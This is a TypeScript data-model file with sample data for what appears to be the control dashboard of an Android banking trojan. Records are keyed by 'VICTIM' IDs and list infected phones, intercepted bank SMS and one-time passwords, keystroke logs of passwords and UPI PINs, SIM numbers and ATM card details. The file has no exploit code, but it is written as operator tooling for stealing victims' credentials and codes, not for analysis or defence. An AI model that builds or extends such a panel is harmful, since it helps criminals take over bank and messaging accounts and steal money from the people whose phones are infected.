// TypeScript interfaces for the dashboard data
export interface DeviceInfo {
  AndroidVersion: string;
  Brand?: string;
  Model?: string;
  SDKVersion?: string;
  ServiceName1?: string;
  ServiceName2?: string;
  SimNumber1?: string;
  SimNumber2?: string;
  IMEI?: string;
  Battery?: string; // e.g., "82%"
  LastSync?: string; // dd-MM-yyyy HH:mm:ss
  WiFi?: string;
  StorageUsed?: string;
  // Extended fields for table + overview
  Status?: string; // e.g., "Online"
  IPAddress?: string; // e.g., "Unknown" or "192.168.1.10"
  UPIPin?: string; // "No Pin" or masked
  Note?: string; // "-"
  Added?: string; // date/time or "-"
  AppsInstalled?: number; // 0..n
}

export interface Message {
  VictimId: string;
  Sender: string;
  Time: string; // dd-MM-yyyy HH:mm:ss
  Body: string;
  SmsType: "INBOX" | "SENT" | string;
}

export interface SimRow { 
  slot: number; 
  carrier: string; 
  number: string; 
}

export interface KeyLog { 
  time: string; 
  text: string; 
}

export interface ATMCard { 
  bank: string; 
  last4: string; 
  name: string; 
}

export interface DBShape {
  DeviceInfo: Record<string, DeviceInfo>;   // key = VictimId
  Messages: Record<string, Message>;        // key = message id
  Sims: Record<string, SimRow[]>;           // key = VictimId
  KeyLogs: Record<string, KeyLog[]>;        // key = VictimId
  UPIPins: Record<string, string[]>;        // key = VictimId
  ATMCards: Record<string, ATMCard[]>;      // key = VictimId
}

// Dummy dataset with expanded data for better demo
export const DB: DBShape = {
  DeviceInfo: {
    "VICTIM-01": {
      AndroidVersion: "14",
      Brand: "motorola",
      Model: "motorola moto g85 5G",
      Battery: "82%",
      LastSync: "13-08-2025 14:52:10",
      Status: "Online",
      IPAddress: "192.168.1.15",
      UPIPin: "No Pin",
      Note: "Primary device",
      Added: "01-08-2025 09:30:00",
      AppsInstalled: 25
    },
    "VICTIM-02": {
      AndroidVersion: "13",
      Brand: "xiaomi",
      Model: "Redmi Note 12",
      Battery: "41%",
      LastSync: "12-08-2025 10:05:33",
      Status: "Online",
      IPAddress: "192.168.1.23",
      UPIPin: "****",
      Note: "Secondary device",
      Added: "03-08-2025 14:22:15",
      AppsInstalled: 12
    },
    "VICTIM-03": {
      AndroidVersion: "12",
      Brand: "samsung",
      Model: "Galaxy A54",
      Battery: "18%",
      LastSync: "11-08-2025 22:15:45",
      Status: "Offline",
      IPAddress: "Unknown",
      UPIPin: "No Pin",
      Note: "Low battery",
      Added: "05-08-2025 11:10:30",
      AppsInstalled: 8
    },
    "VICTIM-04": {
      AndroidVersion: "13",
      Brand: "oppo",
      Model: "OPPO A78 5G",
      Battery: "67%",
      LastSync: "13-08-2025 16:30:22",
      Status: "Online",
      IPAddress: "192.168.1.45",
      UPIPin: "****",
      Note: "-",
      Added: "07-08-2025 08:45:12",
      AppsInstalled: 15
    },
    "VICTIM-05": {
      AndroidVersion: "11",
      Brand: "vivo",
      Model: "Vivo Y21",
      Battery: "91%",
      LastSync: "13-08-2025 13:18:55",
      Status: "Online",
      IPAddress: "192.168.1.78",
      UPIPin: "No Pin",
      Note: "Test device",
      Added: "10-08-2025 16:20:40",
      AppsInstalled: 3
    }
  },
  Messages: {
    "MSG-1001": {
      VictimId: "VICTIM-01",
      Sender: "HDFC Bank",
      Time: "13-08-2025 15:23:11",
      Body: "Amt Rs. 1,250.00 debited from A/C ****1234 on 13-08-25. Info: UPI-P2P-426789123. If not you, call 18002661234. -HDFC Bank",
      SmsType: "INBOX"
    },
    "MSG-1002": {
      VictimId: "VICTIM-01",
      Sender: "OTP-123456",
      Time: "13-08-2025 14:59:05",
      Body: "Your one-time password is 839271. Do not share with anyone for security.",
      SmsType: "INBOX"
    },
    "MSG-1003": {
      VictimId: "VICTIM-02",
      Sender: "Flipkart",
      Time: "12-08-2025 20:01:47",
      Body: "Your order #OD12345 has been shipped and will be delivered by tomorrow. Track: bit.ly/track123",
      SmsType: "INBOX"
    },
    "MSG-1004": {
      VictimId: "VICTIM-01",
      Sender: "PayTM",
      Time: "13-08-2025 12:45:30",
      Body: "Rs. 500 added to your PayTM wallet. Transaction ID: T123456789. Use code SAVE20 for 20% cashback.",
      SmsType: "INBOX"
    },
    "MSG-1005": {
      VictimId: "VICTIM-04",
      Sender: "SBI Bank",
      Time: "13-08-2025 11:30:22",
      Body: "Dear Customer, Rs. 2,000.00 debited from A/C ****5678. Available balance: Rs. 15,450.30",
      SmsType: "INBOX"
    },
    "MSG-1006": {
      VictimId: "VICTIM-02",
      Sender: "Amazon",
      Time: "12-08-2025 18:15:10",
      Body: "Your Amazon Prime subscription renewal payment of Rs. 299 was successful. Enjoy benefits!",
      SmsType: "INBOX"
    },
    "MSG-1007": {
      VictimId: "VICTIM-05",
      Sender: "WhatsApp",
      Time: "13-08-2025 09:45:33",
      Body: "Your WhatsApp verification code is 456789. Do not share this code with anyone.",
      SmsType: "INBOX"
    }
  },
  Sims: {
    "VICTIM-01": [
      { slot: 1, carrier: "Idea", number: "+917526977875" },
      { slot: 2, carrier: "Airtel", number: "+919876543210" }
    ],
    "VICTIM-02": [
      { slot: 1, carrier: "Jio", number: "+919876543210" }
    ],
    "VICTIM-03": [
      { slot: 1, carrier: "Vi", number: "+918765432109" }
    ],
    "VICTIM-04": [
      { slot: 1, carrier: "Jio", number: "+917654321098" },
      { slot: 2, carrier: "", number: "" }
    ],
    "VICTIM-05": [
      { slot: 1, carrier: "BSNL", number: "+916543210987" }
    ]
  },
  KeyLogs: {
    "VICTIM-01": [
      { time: "13-08-2025 12:45:10", text: "otp 839271" },
      { time: "13-08-2025 11:30:22", text: "password123" },
      { time: "13-08-2025 10:15:45", text: "mybank@123" }
    ],
    "VICTIM-02": [
      { time: "12-08-2025 19:30:15", text: "amazon password" },
      { time: "12-08-2025 18:45:33", text: "flipkart login" }
    ],
    "VICTIM-03": [],
    "VICTIM-04": [
      { time: "13-08-2025 14:20:10", text: "upi pin 2456" }
    ],
    "VICTIM-05": [
      { time: "13-08-2025 09:45:33", text: "whatsapp code 456789" }
    ]
  },
  UPIPins: {
    "VICTIM-01": ["No Pin"],
    "VICTIM-02": ["****", "****"],
    "VICTIM-03": ["No Pin"],
    "VICTIM-04": ["****"],
    "VICTIM-05": ["No Pin"]
  },
  ATMCards: {
    "VICTIM-01": [
      { bank: "HDFC", last4: "1234", name: "A Kumar" },
      { bank: "SBI", last4: "5678", name: "A Kumar" }
    ],
    "VICTIM-02": [
      { bank: "ICICI", last4: "9012", name: "R Sharma" }
    ],
    "VICTIM-03": [],
    "VICTIM-04": [
      { bank: "SBI", last4: "3456", name: "M Singh" }
    ],
    "VICTIM-05": []
  }
};

// User configuration
export const USER_NAME = "Krishna";